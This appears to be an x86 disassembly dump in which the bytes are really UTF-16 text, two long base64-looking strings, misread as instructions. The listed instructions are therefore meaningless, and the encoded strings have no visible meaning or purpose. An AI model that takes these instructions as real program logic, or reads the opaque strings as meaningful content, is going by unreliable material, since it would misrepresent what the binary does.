  40b3a3:	00 2b                	add    %ch,(%ebx)
  40b3a5:	00 58 00             	add    %bl,0x0(%eax)
  40b3a8:	58                   	pop    %eax
  40b3a9:	00 6e 00             	add    %ch,0x0(%esi)
  40b3ac:	6b 00 59             	imul   $0x59,(%eax),%eax
  40b3af:	00 42 00             	add    %al,0x0(%edx)
  40b3b2:	61                   	popa
  40b3b3:	00 6a 00             	add    %ch,0x0(%edx)
  40b3b6:	6c                   	insb   (%dx),%es:(%edi)
  40b3b7:	00 33                	add    %dh,(%ebx)
  40b3b9:	00 51 00             	add    %dl,0x0(%ecx)
  40b3bc:	35 00 4f 00 6d       	xor    $0x6d004f00,%eax
  40b3c1:	00 71 00             	add    %dh,0x0(%ecx)
  40b3c4:	72 00                	jb     0x40b3c6
  40b3c6:	73 00                	jae    0x40b3c8
  40b3c8:	36 00 6d 00          	add    %ch,%ss:0x0(%ebp)
  40b3cc:	72 00                	jb     0x40b3ce
  40b3ce:	34 00                	xor    $0x0,%al
  40b3d0:	62 00                	bound  %eax,(%eax)
  40b3d2:	4f                   	dec    %edi
  40b3d3:	00 39                	add    %bh,(%ecx)
  40b3d5:	00 61 00             	add    %ah,0x0(%ecx)
  40b3d8:	6e                   	outsb  %ds:(%esi),(%dx)
  40b3d9:	00 75 00             	add    %dh,0x0(%ebp)
  40b3dc:	55                   	push   %ebp
  40b3dd:	00 39                	add    %bh,(%ecx)
  40b3df:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b3e2:	5a                   	pop    %edx
  40b3e3:	00 6e 00             	add    %ch,0x0(%esi)
  40b3e6:	5a                   	pop    %edx
  40b3e7:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  40b3eb:	00 73 00             	add    %dh,0x0(%ebx)
  40b3ee:	69 00 69 00 4c 00    	imul   $0x4c0069,(%eax),%eax
  40b3f4:	2b 00                	sub    (%eax),%eax
  40b3f6:	4d                   	dec    %ebp
  40b3f7:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b3fa:	2f                   	das
  40b3fb:	00 78 00             	add    %bh,0x0(%eax)
  40b3fe:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40b402:	6c                   	insb   (%dx),%es:(%edi)
  40b403:	00 4b 00             	add    %cl,0x0(%ebx)
  40b406:	36 00 7a 00          	add    %bh,%ss:0x0(%edx)
  40b40a:	34 00                	xor    $0x0,%al
  40b40c:	2b 00                	sub    (%eax),%eax
  40b40e:	4f                   	dec    %edi
  40b40f:	00 71 00             	add    %dh,0x0(%ecx)
  40b412:	33 00                	xor    (%eax),%eax
  40b414:	58                   	pop    %eax
  40b415:	00 37                	add    %dh,(%edi)
  40b417:	00 55 00             	add    %dl,0x0(%ebp)
  40b41a:	51                   	push   %ecx
  40b41b:	00 46 00             	add    %al,0x0(%esi)
  40b41e:	68 00 4a 00 2f       	push   $0x2f004a00
  40b423:	00 50 00             	add    %dl,0x0(%eax)
  40b426:	34 00                	xor    $0x0,%al
  40b428:	73 00                	jae    0x40b42a
  40b42a:	66 00 45 00          	data16 add %al,0x0(%ebp)
  40b42e:	48                   	dec    %eax
  40b42f:	00 61 00             	add    %ah,0x0(%ecx)
  40b432:	67 00 41 00          	add    %al,0x0(%bx,%di)
  40b436:	4b                   	dec    %ebx
  40b437:	00 6a 00             	add    %ch,0x0(%edx)
  40b43a:	48                   	dec    %eax
  40b43b:	00 41 00             	add    %al,0x0(%ecx)
  40b43e:	46                   	inc    %esi
  40b43f:	00 4c 00 43          	add    %cl,0x43(%eax,%eax,1)
  40b443:	00 52 00             	add    %dl,0x0(%edx)
  40b446:	75 00                	jne    0x40b448
  40b448:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  40b44c:	7a 00                	jp     0x40b44e
  40b44e:	43                   	inc    %ebx
  40b44f:	00 54 00 59          	add    %dl,0x59(%eax,%eax,1)
  40b453:	00 62 00             	add    %ah,0x0(%edx)
  40b456:	36 00 55 00          	add    %dl,%ss:0x0(%ebp)
  40b45a:	58                   	pop    %eax
  40b45b:	00 56 00             	add    %dl,0x0(%esi)
  40b45e:	4d                   	dec    %ebp
  40b45f:	00 39                	add    %bh,(%ecx)
  40b461:	00 67 00             	add    %ah,0x0(%edi)
  40b464:	6e                   	outsb  %ds:(%esi),(%dx)
  40b465:	00 62 00             	add    %ah,0x0(%edx)
  40b468:	4e                   	dec    %esi
  40b469:	00 71 00             	add    %dh,0x0(%ecx)
  40b46c:	30 00                	xor    %al,(%eax)
  40b46e:	6d                   	insl   (%dx),%es:(%edi)
  40b46f:	00 4a 00             	add    %cl,0x0(%edx)
  40b472:	4d                   	dec    %ebp
  40b473:	00 78 00             	add    %bh,0x0(%eax)
  40b476:	55                   	push   %ebp
  40b477:	00 68 00             	add    %ch,0x0(%eax)
  40b47a:	76 00                	jbe    0x40b47c
  40b47c:	71 00                	jno    0x40b47e
  40b47e:	56                   	push   %esi
  40b47f:	00 32                	add    %dh,(%edx)
  40b481:	00 70 00             	add    %dh,0x0(%eax)
  40b484:	59                   	pop    %ecx
  40b485:	00 4c 00 47          	add    %cl,0x47(%eax,%eax,1)
  40b489:	00 72 00             	add    %dh,0x0(%edx)
  40b48c:	59                   	pop    %ecx
  40b48d:	00 36                	add    %dh,(%esi)
  40b48f:	00 30                	add    %dh,(%eax)
  40b491:	00 4d 00             	add    %cl,0x0(%ebp)
  40b494:	37                   	aaa
  40b495:	00 5a 00             	add    %bl,0x0(%edx)
  40b498:	77 00                	ja     0x40b49a
  40b49a:	74 00                	je     0x40b49c
  40b49c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b49d:	00 6d 00             	add    %ch,0x0(%ebp)
  40b4a0:	43                   	inc    %ebx
  40b4a1:	00 63 00             	add    %ah,0x0(%ebx)
  40b4a4:	62 00                	bound  %eax,(%eax)
  40b4a6:	58                   	pop    %eax
  40b4a7:	00 78 00             	add    %bh,0x0(%eax)
  40b4aa:	6c                   	insb   (%dx),%es:(%edi)
  40b4ab:	00 69 00             	add    %ch,0x0(%ecx)
  40b4ae:	35 00 45 00 7a       	xor    $0x7a004500,%eax
  40b4b3:	00 76 00             	add    %dh,0x0(%esi)
  40b4b6:	33 00                	xor    (%eax),%eax
  40b4b8:	75 00                	jne    0x40b4ba
  40b4ba:	38 00                	cmp    %al,(%eax)
  40b4bc:	36 00 66 00          	add    %ah,%ss:0x0(%esi)
  40b4c0:	74 00                	je     0x40b4c2
  40b4c2:	42                   	inc    %edx
  40b4c3:	00 63 00             	add    %ah,0x0(%ebx)
  40b4c6:	77 00                	ja     0x40b4c8
  40b4c8:	63 00                	arpl   %eax,(%eax)
  40b4ca:	30 00                	xor    %al,(%eax)
  40b4cc:	50                   	push   %eax
  40b4cd:	00 4f 00             	add    %cl,0x0(%edi)
  40b4d0:	6b 00 71             	imul   $0x71,(%eax),%eax
  40b4d3:	00 6a 00             	add    %ch,0x0(%edx)
  40b4d6:	6b 00 67             	imul   $0x67,(%eax),%eax
  40b4d9:	00 6d 00             	add    %ch,0x0(%ebp)
  40b4dc:	57                   	push   %edi
  40b4dd:	00 33                	add    %dh,(%ebx)
  40b4df:	00 63 00             	add    %ah,0x0(%ebx)
  40b4e2:	43                   	inc    %ebx
  40b4e3:	00 6a 00             	add    %ch,0x0(%edx)
  40b4e6:	41                   	inc    %ecx
  40b4e7:	00 77 00             	add    %dh,0x0(%edi)
  40b4ea:	46                   	inc    %esi
  40b4eb:	00 4a 00             	add    %cl,0x0(%edx)
  40b4ee:	38 00                	cmp    %al,(%eax)
  40b4f0:	76 00                	jbe    0x40b4f2
  40b4f2:	71 00                	jno    0x40b4f4
  40b4f4:	78 00                	js     0x40b4f6
  40b4f6:	52                   	push   %edx
  40b4f7:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
  40b4fb:	00 42 00             	add    %al,0x0(%edx)
  40b4fe:	68 00 6d 00 4f       	push   $0x4f006d00
  40b503:	00 67 00             	add    %ah,0x0(%edi)
  40b506:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  40b50a:	46                   	inc    %esi
  40b50b:	00 45 00             	add    %al,0x0(%ebp)
  40b50e:	35 00 4e 00 50       	xor    $0x50004e00,%eax
  40b513:	00 7a 00             	add    %bh,0x0(%edx)
  40b516:	37                   	aaa
  40b517:	00 46 00             	add    %al,0x0(%esi)
  40b51a:	6c                   	insb   (%dx),%es:(%edi)
  40b51b:	00 54 00 7a          	add    %dl,0x7a(%eax,%eax,1)
  40b51f:	00 69 00             	add    %ch,0x0(%ecx)
  40b522:	73 00                	jae    0x40b524
  40b524:	31 00                	xor    %eax,(%eax)
  40b526:	34 00                	xor    $0x0,%al
  40b528:	43                   	inc    %ebx
  40b529:	00 66 00             	add    %ah,0x0(%esi)
  40b52c:	45                   	inc    %ebp
  40b52d:	00 5a 00             	add    %bl,0x0(%edx)
  40b530:	6c                   	insb   (%dx),%es:(%edi)
  40b531:	00 2f                	add    %ch,(%edi)
  40b533:	00 63 00             	add    %ah,0x0(%ebx)
  40b536:	67 00 2f             	add    %ch,(%bx)
  40b539:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b53c:	46                   	inc    %esi
  40b53d:	00 51 00             	add    %dl,0x0(%ecx)
  40b540:	6d                   	insl   (%dx),%es:(%edi)
  40b541:	00 73 00             	add    %dh,0x0(%ebx)
  40b544:	74 00                	je     0x40b546
  40b546:	58                   	pop    %eax
  40b547:	00 4f 00             	add    %cl,0x0(%edi)
  40b54a:	63 00                	arpl   %eax,(%eax)
  40b54c:	79 00                	jns    0x40b54e
  40b54e:	45                   	inc    %ebp
  40b54f:	00 69 00             	add    %ch,0x0(%ecx)
  40b552:	7a 00                	jp     0x40b554
  40b554:	57                   	push   %edi
  40b555:	00 32                	add    %dh,(%edx)
  40b557:	00 6a 00             	add    %ch,0x0(%edx)
  40b55a:	44                   	inc    %esp
  40b55b:	00 54 00 66          	add    %dl,0x66(%eax,%eax,1)
  40b55f:	00 7a 00             	add    %bh,0x0(%edx)
  40b562:	34 00                	xor    $0x0,%al
  40b564:	45                   	inc    %ebp
  40b565:	00 36                	add    %dh,(%esi)
  40b567:	00 52 00             	add    %dl,0x0(%edx)
  40b56a:	4a                   	dec    %edx
  40b56b:	00 56 00             	add    %dl,0x0(%esi)
  40b56e:	73 00                	jae    0x40b570
  40b570:	4f                   	dec    %edi
  40b571:	00 48 00             	add    %cl,0x0(%eax)
  40b574:	38 00                	cmp    %al,(%eax)
  40b576:	76 00                	jbe    0x40b578
  40b578:	74 00                	je     0x40b57a
  40b57a:	48                   	dec    %eax
  40b57b:	00 35 00 55 00 63    	add    %dh,0x63005500
  40b581:	00 33                	add    %dh,(%ebx)
  40b583:	00 6a 00             	add    %ch,0x0(%edx)
  40b586:	62 00                	bound  %eax,(%eax)
  40b588:	66 00 45 00          	data16 add %al,0x0(%ebp)
  40b58c:	5a                   	pop    %edx
  40b58d:	00 2b                	add    %ch,(%ebx)
  40b58f:	00 4e 00             	add    %cl,0x0(%esi)
  40b592:	58                   	pop    %eax
  40b593:	00 6e 00             	add    %ch,0x0(%esi)
  40b596:	56                   	push   %esi
  40b597:	00 69 00             	add    %ch,0x0(%ecx)
  40b59a:	51                   	push   %ecx
  40b59b:	00 52 00             	add    %dl,0x0(%edx)
  40b59e:	49                   	dec    %ecx
  40b59f:	00 78 00             	add    %bh,0x0(%eax)
  40b5a2:	46                   	inc    %esi
  40b5a3:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  40b5a7:	00 6b 00             	add    %ch,0x0(%ebx)
  40b5aa:	31 00                	xor    %eax,(%eax)
  40b5ac:	2f                   	das
  40b5ad:	00 2f                	add    %ch,(%edi)
  40b5af:	00 47 00             	add    %al,0x0(%edi)
  40b5b2:	4b                   	dec    %ebx
  40b5b3:	00 55 00             	add    %dl,0x0(%ebp)
  40b5b6:	50                   	push   %eax
  40b5b7:	00 32                	add    %dh,(%edx)
  40b5b9:	00 50 00             	add    %dl,0x0(%eax)
  40b5bc:	5a                   	pop    %edx
  40b5bd:	00 48 00             	add    %cl,0x0(%eax)
  40b5c0:	70 00                	jo     0x40b5c2
  40b5c2:	58                   	pop    %eax
  40b5c3:	00 63 00             	add    %ah,0x0(%ebx)
  40b5c6:	7a 00                	jp     0x40b5c8
  40b5c8:	59                   	pop    %ecx
  40b5c9:	00 50 00             	add    %dl,0x0(%eax)
  40b5cc:	49                   	dec    %ecx
  40b5cd:	00 31                	add    %dh,(%ecx)
  40b5cf:	00 61 00             	add    %ah,0x0(%ecx)
  40b5d2:	53                   	push   %ebx
  40b5d3:	00 58 00             	add    %bl,0x0(%eax)
  40b5d6:	30 00                	xor    %al,(%eax)
  40b5d8:	54                   	push   %esp
  40b5d9:	00 37                	add    %dh,(%edi)
  40b5db:	00 4e 00             	add    %cl,0x0(%esi)
  40b5de:	35 00 76 00 33       	xor    $0x33007600,%eax
  40b5e3:	00 68 00             	add    %ch,0x0(%eax)
  40b5e6:	79 00                	jns    0x40b5e8
  40b5e8:	56                   	push   %esi
  40b5e9:	00 44 00 35          	add    %al,0x35(%eax,%eax,1)
  40b5ed:	00 38                	add    %bh,(%eax)
  40b5ef:	00 73 00             	add    %dh,0x0(%ebx)
  40b5f2:	69 00 45 00 35 00    	imul   $0x350045,(%eax),%eax
  40b5f8:	42                   	inc    %edx
  40b5f9:	00 52 00             	add    %dl,0x0(%edx)
  40b5fc:	56                   	push   %esi
  40b5fd:	00 4e 00             	add    %cl,0x0(%esi)
  40b600:	69 00 78 00 5a 00    	imul   $0x5a0078,(%eax),%eax
  40b606:	68 00 37 00 66       	push   $0x66003700
  40b60b:	00 32                	add    %dh,(%edx)
  40b60d:	00 79 00             	add    %bh,0x0(%ecx)
  40b610:	43                   	inc    %ebx
  40b611:	00 46 00             	add    %al,0x0(%esi)
  40b614:	54                   	push   %esp
  40b615:	00 55 00             	add    %dl,0x0(%ebp)
  40b618:	62 00                	bound  %eax,(%eax)
  40b61a:	77 00                	ja     0x40b61c
  40b61c:	51                   	push   %ecx
  40b61d:	00 58 00             	add    %bl,0x0(%eax)
  40b620:	6e                   	outsb  %ds:(%esi),(%dx)
  40b621:	00 5a 00             	add    %bl,0x0(%edx)
  40b624:	54                   	push   %esp
  40b625:	00 36                	add    %dh,(%esi)
  40b627:	00 71 00             	add    %dh,0x0(%ecx)
  40b62a:	44                   	inc    %esp
  40b62b:	00 73 00             	add    %dh,0x0(%ebx)
  40b62e:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  40b631:	00 77 00             	add    %dh,0x0(%edi)
  40b634:	79 00                	jns    0x40b636
  40b636:	51                   	push   %ecx
  40b637:	00 53 00             	add    %dl,0x0(%ebx)
  40b63a:	4a                   	dec    %edx
  40b63b:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  40b63f:	00 43 00             	add    %al,0x0(%ebx)
  40b642:	39 00                	cmp    %eax,(%eax)
  40b644:	69 00 77 00 74 00    	imul   $0x740077,(%eax),%eax
  40b64a:	79 00                	jns    0x40b64c
  40b64c:	36 00 4c 00 30       	add    %cl,%ss:0x30(%eax,%eax,1)
  40b651:	00 49 00             	add    %cl,0x0(%ecx)
  40b654:	72 00                	jb     0x40b656
  40b656:	46                   	inc    %esi
  40b657:	00 53 00             	add    %dl,0x0(%ebx)
  40b65a:	4c                   	dec    %esp
  40b65b:	00 2b                	add    %ch,(%ebx)
  40b65d:	00 41 00             	add    %al,0x0(%ecx)
  40b660:	55                   	push   %ebp
  40b661:	00 49 00             	add    %cl,0x0(%ecx)
  40b664:	3d 00 00 87 b1       	cmp    $0xb1870000,%eax
  40b669:	53                   	push   %ebx
  40b66a:	00 52 00             	add    %dl,0x0(%edx)
  40b66d:	4a                   	dec    %edx
  40b66e:	00 6b 00             	add    %ch,0x0(%ebx)
  40b671:	39 00                	cmp    %eax,(%eax)
  40b673:	63 00                	arpl   %eax,(%eax)
  40b675:	4f                   	dec    %edi
  40b676:	00 67 00             	add    %ah,0x0(%edi)
  40b679:	63 00                	arpl   %eax,(%eax)
  40b67b:	4c                   	dec    %esp
  40b67c:	00 62 00             	add    %ah,0x0(%edx)
  40b67f:	6d                   	insl   (%dx),%es:(%edi)
  40b680:	00 73 00             	add    %dh,0x0(%ebx)
  40b683:	77 00                	ja     0x40b685
  40b685:	6d                   	insl   (%dx),%es:(%edi)
  40b686:	00 37                	add    %dh,(%edi)
  40b688:	00 61 00             	add    %ah,0x0(%ecx)
  40b68b:	79 00                	jns    0x40b68d
  40b68d:	73 00                	jae    0x40b68f
  40b68f:	4d                   	dec    %ebp
  40b690:	00 66 00             	add    %ah,0x0(%esi)
  40b693:	74 00                	je     0x40b695
  40b695:	74 00                	je     0x40b697
  40b697:	69 00 63 00 50 00    	imul   $0x500063,(%eax),%eax
  40b69d:	36 00 6d 00          	add    %ch,%ss:0x0(%ebp)
  40b6a1:	6f                   	outsl  %ds:(%esi),(%dx)
  40b6a2:	00 66 00             	add    %ah,0x0(%esi)
  40b6a5:	32 00                	xor    (%eax),%al
  40b6a7:	39 00                	cmp    %eax,(%eax)
  40b6a9:	38 00                	cmp    %al,(%eax)
  40b6ab:	38 00                	cmp    %al,(%eax)
  40b6ad:	66 00 4a 00          	data16 add %cl,0x0(%edx)
  40b6b1:	6a 00                	push   $0x0
  40b6b3:	53                   	push   %ebx
  40b6b4:	00 38                	add    %bh,(%eax)
  40b6b6:	00 61 00             	add    %ah,0x0(%ecx)
  40b6b9:	35 00 73 00 73       	xor    $0x73007300,%eax
  40b6be:	00 6a 00             	add    %ch,0x0(%edx)
  40b6c1:	45                   	inc    %ebp
  40b6c2:	00 4f 00             	add    %cl,0x0(%edi)
  40b6c5:	35 00 75 00 54       	xor    $0x54007500,%eax
  40b6ca:	00 49 00             	add    %cl,0x0(%ecx)
  40b6cd:	6d                   	insl   (%dx),%es:(%edi)
  40b6ce:	00 6c 00 36          	add    %ch,0x36(%eax,%eax,1)
  40b6d2:	00 4a 00             	add    %cl,0x0(%edx)
  40b6d5:	39 00                	cmp    %eax,(%eax)
  40b6d7:	33 00                	xor    (%eax),%eax
  40b6d9:	71 00                	jno    0x40b6db
  40b6db:	74 00                	je     0x40b6dd
  40b6dd:	33 00                	xor    (%eax),%eax
  40b6df:	71 00                	jno    0x40b6e1
  40b6e1:	57                   	push   %edi
  40b6e2:	00 31                	add    %dh,(%ecx)
  40b6e4:	00 78 00             	add    %bh,0x0(%eax)
  40b6e7:	6d                   	insl   (%dx),%es:(%edi)
  40b6e8:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40b6ec:	00 5a 00             	add    %bl,0x0(%edx)
  40b6ef:	71 00                	jno    0x40b6f1
  40b6f1:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  40b6f5:	44                   	inc    %esp
  40b6f6:	00 77 00             	add    %dh,0x0(%edi)
  40b6f9:	43                   	inc    %ebx
  40b6fa:	00 6f 00             	add    %ch,0x0(%edi)
  40b6fd:	58                   	pop    %eax
  40b6fe:	00 77 00             	add    %dh,0x0(%edi)
  40b701:	66 00 7a 00          	data16 add %bh,0x0(%edx)
  40b705:	77 00                	ja     0x40b707
  40b707:	36 00 37             	add    %dh,%ss:(%edi)
  40b70a:	00 41 00             	add    %al,0x0(%ecx)
  40b70d:	43                   	inc    %ebx
  40b70e:	00 70 00             	add    %dh,0x0(%eax)
  40b711:	4e                   	dec    %esi
  40b712:	00 45 00             	add    %al,0x0(%ebp)
  40b715:	5a                   	pop    %edx
  40b716:	00 36                	add    %dh,(%esi)
  40b718:	00 77 00             	add    %dh,0x0(%edi)
  40b71b:	4f                   	dec    %edi
  40b71c:	00 59 00             	add    %bl,0x0(%ecx)
  40b71f:	6c                   	insb   (%dx),%es:(%edi)
  40b720:	00 67 00             	add    %ah,0x0(%edi)
  40b723:	37                   	aaa
  40b724:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b727:	5a                   	pop    %edx
  40b728:	00 70 00             	add    %dh,0x0(%eax)
  40b72b:	66 00 6b 00          	data16 add %ch,0x0(%ebx)
  40b72f:	41                   	inc    %ecx
  40b730:	00 71 00             	add    %dh,0x0(%ecx)
  40b733:	77 00                	ja     0x40b735
  40b735:	66 00 42 00          	data16 add %al,0x0(%edx)
  40b739:	50                   	push   %eax
  40b73a:	00 78 00             	add    %bh,0x0(%eax)
  40b73d:	30 00                	xor    %al,(%eax)
  40b73f:	70 00                	jo     0x40b741
  40b741:	49                   	dec    %ecx
  40b742:	00 6d 00             	add    %ch,0x0(%ebp)
  40b745:	57                   	push   %edi
  40b746:	00 45 00             	add    %al,0x0(%ebp)
  40b749:	2b 00                	sub    (%eax),%eax
  40b74b:	79 00                	jns    0x40b74d
  40b74d:	44                   	inc    %esp
  40b74e:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40b752:	00 66 00             	add    %ah,0x0(%esi)
  40b755:	58                   	pop    %eax
  40b756:	00 4b 00             	add    %cl,0x0(%ebx)
  40b759:	72 00                	jb     0x40b75b
  40b75b:	61                   	popa
  40b75c:	00 4e 00             	add    %cl,0x0(%esi)
  40b75f:	72 00                	jb     0x40b761
  40b761:	4d                   	dec    %ebp
  40b762:	00 41 00             	add    %al,0x0(%ecx)
  40b765:	2b 00                	sub    (%eax),%eax
  40b767:	42                   	inc    %edx
  40b768:	00 67 00             	add    %ah,0x0(%edi)
  40b76b:	6a 00                	push   $0x0
  40b76d:	71 00                	jno    0x40b76f
  40b76f:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40b773:	54                   	push   %esp
  40b774:	00 33                	add    %dh,(%ebx)
  40b776:	00 6e 00             	add    %ch,0x0(%esi)
  40b779:	39 00                	cmp    %eax,(%eax)
  40b77b:	4a                   	dec    %edx
  40b77c:	00 4f 00             	add    %cl,0x0(%edi)
  40b77f:	45                   	inc    %ebp
  40b780:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  40b784:	00 65 00             	add    %ah,0x0(%ebp)
  40b787:	35 00 71 00 71       	xor    $0x71007100,%eax
  40b78c:	00 59 00             	add    %bl,0x0(%ecx)
  40b78f:	4b                   	dec    %ebx
  40b790:	00 38                	add    %bh,(%eax)
  40b792:	00 4a 00             	add    %cl,0x0(%edx)
  40b795:	4e                   	dec    %esi
  40b796:	00 66 00             	add    %ah,0x0(%esi)
  40b799:	39 00                	cmp    %eax,(%eax)
  40b79b:	65 00 68 00          	add    %ch,%gs:0x0(%eax)
  40b79f:	72 00                	jb     0x40b7a1
  40b7a1:	73 00                	jae    0x40b7a3
  40b7a3:	6a 00                	push   $0x0
  40b7a5:	41                   	inc    %ecx
  40b7a6:	00 66 00             	add    %ah,0x0(%esi)
  40b7a9:	41                   	inc    %ecx
  40b7aa:	00 4b 00             	add    %cl,0x0(%ebx)
  40b7ad:	30 00                	xor    %al,(%eax)
  40b7af:	4f                   	dec    %edi
  40b7b0:	00 6f 00             	add    %ch,0x0(%edi)
  40b7b3:	59                   	pop    %ecx
  40b7b4:	00 68 00             	add    %ch,0x0(%eax)
  40b7b7:	7a 00                	jp     0x40b7b9
  40b7b9:	35 00 52 00 6d       	xor    $0x6d005200,%eax
  40b7be:	00 50 00             	add    %dl,0x0(%eax)
  40b7c1:	50                   	push   %eax
  40b7c2:	00 4a 00             	add    %cl,0x0(%edx)
  40b7c5:	6c                   	insb   (%dx),%es:(%edi)
  40b7c6:	00 2b                	add    %ch,(%ebx)
  40b7c8:	00 63 00             	add    %ah,0x0(%ebx)
  40b7cb:	52                   	push   %edx
  40b7cc:	00 62 00             	add    %ah,0x0(%edx)
  40b7cf:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7d0:	00 55 00             	add    %dl,0x0(%ebp)
  40b7d3:	62 00                	bound  %eax,(%eax)
  40b7d5:	4e                   	dec    %esi
  40b7d6:	00 67 00             	add    %ah,0x0(%edi)
  40b7d9:	4e                   	dec    %esi
  40b7da:	00 4a 00             	add    %cl,0x0(%edx)
  40b7dd:	66 00 57 00          	data16 add %dl,0x0(%edi)
  40b7e1:	42                   	inc    %edx
  40b7e2:	00 63 00             	add    %ah,0x0(%ebx)
  40b7e5:	7a 00                	jp     0x40b7e7
  40b7e7:	74 00                	je     0x40b7e9
  40b7e9:	59                   	pop    %ecx
  40b7ea:	00 77 00             	add    %dh,0x0(%edi)
  40b7ed:	6d                   	insl   (%dx),%es:(%edi)
  40b7ee:	00 46 00             	add    %al,0x0(%esi)
  40b7f1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7f2:	00 61 00             	add    %ah,0x0(%ecx)
  40b7f5:	58                   	pop    %eax
  40b7f6:	00 77 00             	add    %dh,0x0(%edi)
  40b7f9:	50                   	push   %eax
  40b7fa:	00 64 00 35          	add    %ah,0x35(%eax,%eax,1)
  40b7fe:	00 47 00             	add    %al,0x0(%edi)
  40b801:	77 00                	ja     0x40b803
  40b803:	65 00 4f 00          	add    %cl,%gs:0x0(%edi)
  40b807:	48                   	dec    %eax
  40b808:	00 4a 00             	add    %cl,0x0(%edx)
  40b80b:	39 00                	cmp    %eax,(%eax)
  40b80d:	46                   	inc    %esi
  40b80e:	00 6a 00             	add    %ch,0x0(%edx)
  40b811:	48                   	dec    %eax
  40b812:	00 6c 00 32          	add    %ch,0x32(%eax,%eax,1)
  40b816:	00 49 00             	add    %cl,0x0(%ecx)
  40b819:	58                   	pop    %eax
  40b81a:	00 36                	add    %dh,(%esi)
  40b81c:	00 5a 00             	add    %bl,0x0(%edx)
  40b81f:	6e                   	outsb  %ds:(%esi),(%dx)
  40b820:	00 6e 00             	add    %ch,0x0(%esi)
  40b823:	6c                   	insb   (%dx),%es:(%edi)
  40b824:	00 2f                	add    %ch,(%edi)
  40b826:	00 75 00             	add    %dh,0x0(%ebp)
  40b829:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
  40b82d:	50                   	push   %eax
  40b82e:	00 33                	add    %dh,(%ebx)
  40b830:	00 79 00             	add    %bh,0x0(%ecx)
  40b833:	61                   	popa
  40b834:	00 37                	add    %dh,(%edi)
  40b836:	00 36                	add    %dh,(%esi)
  40b838:	00 56 00             	add    %dl,0x0(%esi)
  40b83b:	65 00 52 00          	add    %dl,%gs:0x0(%edx)
  40b83f:	4f                   	dec    %edi
  40b840:	00 54 00 38          	add    %dl,0x38(%eax,%eax,1)
  40b844:	00 48 00             	add    %cl,0x0(%eax)
  40b847:	44                   	inc    %esp
  40b848:	00 71 00             	add    %dh,0x0(%ecx)
  40b84b:	66 00 36             	data16 add %dh,(%esi)
  40b84e:	00 61 00             	add    %ah,0x0(%ecx)
  40b851:	4a                   	dec    %edx
  40b852:	00 4b 00             	add    %cl,0x0(%ebx)
  40b855:	35 00 66 00 43       	xor    $0x43006600,%eax
  40b85a:	00 4a 00             	add    %cl,0x0(%edx)
  40b85d:	69 00 66 00 66 00    	imul   $0x660066,(%eax),%eax
  40b863:	69 00 68 00 6f 00    	imul   $0x6f0068,(%eax),%eax
  40b869:	6d                   	insl   (%dx),%es:(%edi)
  40b86a:	00 56 00             	add    %dl,0x0(%esi)
  40b86d:	4a                   	dec    %edx
  40b86e:	00 49 00             	add    %cl,0x0(%ecx)
  40b871:	4a                   	dec    %edx
  40b872:	00 56 00             	add    %dl,0x0(%esi)
  40b875:	68 00 72 00 39       	push   $0x39007200
  40b87a:	00 54 00 2b          	add    %dl,0x2b(%eax,%eax,1)
  40b87e:	00 46 00             	add    %al,0x0(%esi)
  40b881:	44                   	inc    %esp
  40b882:	00 31                	add    %dh,(%ecx)
  40b884:	00 31                	add    %dh,(%ecx)
  40b886:	00 32                	add    %dh,(%edx)
  40b888:	00 37                	add    %dh,(%edi)
  40b88a:	00 57 00             	add    %dl,0x0(%edi)
  40b88d:	4f                   	dec    %edi
  40b88e:	00 69 00             	add    %ch,0x0(%ecx)
  40b891:	72 00                	jb     0x40b893
  40b893:	79 00                	jns    0x40b895
  40b895:	6d                   	insl   (%dx),%es:(%edi)
  40b896:	00 63 00             	add    %ah,0x0(%ebx)
  40b899:	47                   	inc    %edi
  40b89a:	00 49 00             	add    %cl,0x0(%ecx)
  40b89d:	61                   	popa
  40b89e:	00 79 00             	add    %bh,0x0(%ecx)
  40b8a1:	2f                   	das
  40b8a2:	00 36                	add    %dh,(%esi)
  40b8a4:	00 64 00 53          	add    %ah,0x53(%eax,%eax,1)
  40b8a8:	00 41 00             	add    %al,0x0(%ecx)
  40b8ab:	61                   	popa
  40b8ac:	00 37                	add    %dh,(%edi)
  40b8ae:	00 43 00             	add    %al,0x0(%ebx)
  40b8b1:	50                   	push   %eax
  40b8b2:	00 42 00             	add    %al,0x0(%edx)
  40b8b5:	59                   	pop    %ecx
  40b8b6:	00 49 00             	add    %cl,0x0(%ecx)
  40b8b9:	76 00                	jbe    0x40b8bb
  40b8bb:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40b8bf:	6c                   	insb   (%dx),%es:(%edi)
  40b8c0:	00 4b 00             	add    %cl,0x0(%ebx)
  40b8c3:	42                   	inc    %edx
  40b8c4:	00 46 00             	add    %al,0x0(%esi)
  40b8c7:	77 00                	ja     0x40b8c9
  40b8c9:	4d                   	dec    %ebp
  40b8ca:	00 6a 00             	add    %ch,0x0(%edx)
  40b8cd:	51                   	push   %ecx
  40b8ce:	00 62 00             	add    %ah,0x0(%edx)
  40b8d1:	47                   	inc    %edi
  40b8d2:	00 47 00             	add    %al,0x0(%edi)
  40b8d5:	70 00                	jo     0x40b8d7
  40b8d7:	44                   	inc    %esp
  40b8d8:	00 6a 00             	add    %ch,0x0(%edx)
  40b8db:	49                   	dec    %ecx
  40b8dc:	00 4d 00             	add    %cl,0x0(%ebp)
  40b8df:	62 00                	bound  %eax,(%eax)
  40b8e1:	75 00                	jne    0x40b8e3
